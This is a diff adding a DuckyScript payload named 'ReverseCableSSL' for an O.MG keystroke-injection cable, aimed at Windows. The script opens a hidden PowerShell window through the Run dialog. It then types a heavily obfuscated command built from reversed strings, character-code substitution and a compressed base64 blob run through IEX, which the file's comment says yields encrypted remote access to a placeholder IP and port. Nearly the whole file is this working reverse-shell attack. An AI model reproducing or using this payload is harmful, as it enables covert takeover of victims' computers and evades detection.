@@ -1,0 +1,38 @@
+REM       ReverseCableSSL
+REM       Version 1.0
+REM       OS: Windows
+REM       Author: 0iphor13
+REM	  Requirements: OMG Firmware v.2.5 or higher
+
+REM       Getting encrypted remote access via obfuscated powershell code
+
+DELAY 500
+DUCKY_LANG de
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -w hidden
+DELAY 500
+ENTER
+DELAY 300
+STRING $IP='0.0.0.0';$PORT=PORT;( -joIn [reGEX]::mAtcHeS( (")''NIOj-'X'+]3,1[)(gnirtsOt.ecNErefeRpesobreV$ "+'('+'& '+(('b'+'8'+'J ')-crepLAce  'b8J',[ChAR]124)+")'$','8yj'(EcalpER.)'|',)801]RaHC[+021]RaHC[+25]RaHC[((EcalpER.)93]RaHC[]GniRtS[,)501]RaHC[+07]RaHC[+18]RaHC[((EcalpER.)')iFQiFQNIO
+DELAY 100
+STRING j-]52,42,4[CEPS'+'moC:VNE8yj "+('(.{0'+'}+{0} ') -F [chAR]39+'l'+'x4) '+'(Dne'+'OTDAer'+'.'+') '+(')'+'II'+'CSa::'+']g'+'nidoCNE.tX{'+'0}+{'+'0'+'}e'+'T.M'+'eTS'+'ys[, ') -F[cHaR]39+'))Ss'+'ErPMoceD::]EDo'+'MNO'+'iSsErpMOc.'+'No'+'is'+'s'+'ERpmoc.'+'OI'+'.met'+'SY'+'s'+'[ '+', '+('{0}+'+'{'+'0})
+DELAY 100
+STRING iFQ'+'==AA/hj'+'7zf1K/Vp7dl46NLLtuomB'+'Vjldn'+'vd'+'O7Q'+'uWq1vWq'+'dEK4{'+'0'+'}+{0}'+'2LO1C1nN'+'J'+'KbGpPgNZ2{0}+{'+'0}kcRl'+'w0TqY5392e'+'0VwS54cTkkC'+'5'+'s19h'+'3sI+Zgvt'+'7{0}+{'+'0}o29O7scluP{'+'0}'+'+{0}hkQQ'+'Wj'+'LZv'+'JBlFC'+'e'+'Th9'+'aG'+'5KLFOV'+'i/kg'+'Yxa'+'Nt'+'Et/1gZ'+'fyn4I
+DELAY 100
+STRING b99DLte{0}+'+'{0}hwi'+'1'+'m'+'gaGk'+'g5RTQ'+'F9'+'K'+'PhoE5w'+'Vfef0CI'+'yk'+'sf'+'4'+'69'+'AZdU'+'cTsit2F'+'ZaJnXjBzU'+'Dvn'+'LmXn'+'Lg{'+'0}'+'+{'+'0}'+'kF'+'denv8tt+2I/5'+'7vfyhfh0'+'q'+'YBe'+'fWqTbiG'+'2wsmzFoYrfq3du9'+'G2v'+'ni2Pxi'+'u5'+'E+rl2/kJ6h0z2DI'+'rdGbIEs'+'C'+'yY8I'+'9Qb'+'/'+'H
+DELAY 100
+STRING 4'+'pZVcpRQ6WNp'+'T'+'2bR00gHk85r'+'phUNFfbdAoeV7mI22'+'+6zpfqc'+'WTqo7zkk'+'OX'+'J'+'X6Qw'+'LdsnwdnrsQo'+'uWm'+'hzAA5IrSgng3'+'a'+'WtY18rl'+'AS/6dW68K'+'K'+'3VYR0rEv'+'6VI'+'pH2S{0}+{0}Nog'+'b'+'bcMsd'+'FGpbNXc'+'eCN'+'6tQ'+'MCri'+'gl'+'g'+'elpR'+'IPOhP'+'KeLGV'+'/'+'7p'+'J'+'ZJYq6+h'+'Ciet
+DELAY 100
+STRING n'+'Qt'+'MlG'+'EfB7'+'hP'+'o'+'nAgs'+'r{0}+{0}NR'+'gf8'+'oY8H3RInOlx1'+'DxbJxwL'+'x'+'NKIkcn'+'h{0}+{0}QUqm{0}+{0}uCo'+'qD7HGJr'+'Z/dmXH'+'aiYxDK'+'P+lv{0}+{'+'0}WFrEk'+'g{0'+'}+{0}A0PBo{0}+'+'{'+'0}wuOzmwVW'+'{0}+{0}UBS/{0}+{0}Y/'+'elW'+'+tHcXNgWO5'+'wBB/Mf'+'gle6u'+'Smr0{0}'+'+{0}gsQIzh8IcULL11
+DELAY 100
+STRING kglce'+'5F'+'Z7VWZMS3KxF'+'AE3w6co7'+'V'+'JdJSWTwI'+'TO'+'JjdtUmK'+'BDNYS'+'EpJPV'+'0Sqr'+'4Dwv'+'3'+'e'+'QZomXGG'+'J'+'7g/{'+'0}+{0'+'}9G'+'VsOAS2r0/'+'+{'+'0'+'}+{0}2N'+'xdKe3e9+efHiS{0}+'+'{0}'+'od3mfSY3'+'df3ftWM'+'bE'+'SNUWt'+'A'+'Hm+AiPaTCQ6A5q'+'Q4u'+'VrOk7mKl46E'+'Xsi'+'I8ve2PEwo'+'9bv
+DELAY 100
+STRING P'+'VfiFQ ')-F  [chAR]39+('(gN'+'I'+'R'+'Ts4'+'6EsAbmorFrNf'+'+rNf::]TREvn'+'oC'+'[ ').replace('rNf',[STRINg][CHar]39)+((']'+'mAEr'+'TSyroMem'+'.oI'+'.m6j'+'x+6'+'jx'+'et'+'SY'+'s6jx+6jx[ ')-rEPLaCe  '6jx',[Char]39)+('(MaFy'+'5+Fy5E'+'RTS'+'F'+'y5'+'+F'+'y5'+'EtAlf'+'Ed.noi'+'S'+'SERP'+'F
+DELAY 100
+STRING y'+'5'+'+Fy5M'+'O'+'C.Oi ').replACE('Fy5',[STRINg][ChAr]39)+'tc'+'ejBO'+'-weN '+'( '+(('(rE'+'dA'+'eRmAE'+'P5'+'d+P5dr'+'P5d+P'+'5dTS'+'.oI ')  -repLaCE 'P5d',[CHAr]39)+('tcejBORrV+Rr'+'V-'+'weNRr'+'V'+'+RrV('+' ').RepLace('RrV',[STrING][cHaR]39)+('XI'+'B( ').RePlAce(([chAR]88+[chAR]73+[chAR]6
+DELAY 100
+STRING 6),[STrIng][chAR]39)+''), '.' , ('RI'+'G'+'HTtoLefT')) )| IeX
+DELAY 200
+ENTER
